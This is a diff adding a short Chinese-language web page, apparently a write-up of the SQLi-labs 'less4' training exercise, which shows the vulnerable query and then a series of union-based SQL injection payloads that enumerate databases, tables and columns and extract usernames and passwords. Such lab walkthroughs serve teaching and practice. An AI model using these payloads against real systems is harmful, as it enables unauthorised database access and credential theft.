@@ -1,0 +1,15 @@
+<hr>
+<h2 id="title-less4url-https-www-yuque-com-u29002979-ep2zrx-ntg3b3f1yd0bmxig"><a href="#title-less4url-https-www-yuque-com-u29002979-ep2zrx-ntg3b3f1yd0bmxig" class="headerlink" title="title: less4url: https://www.yuque.com/u29002979/ep2zrx/ntg3b3f1yd0bmxig"></a>title: less4<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ntg3b3f1yd0bmxig">https://www.yuque.com/u29002979/ep2zrx/ntg3b3f1yd0bmxig</a></h2><pre><code class="bash">$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;
+</code></pre>
+<p>加双引号和括号。</p>
+<p><code>?id=1&quot;</code>报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4– “) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>用”)闭合<br><code>?id=1&quot;) order by 4--+</code>报错<br><code>?id=1&quot;) order by 3--+</code>不报错,3列</p>
+<p><code>?id=-1&quot;) union select 1,2,3 --+回显点2,3</code></p>
+<p><code>?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p>
+<p><code>?id=-1&quot;)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p>
+<p><code>?id=-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
+<p><code>?id=-1&quot;) union select 1,2,(select group_concat(username,password) from users)--+</code></p>
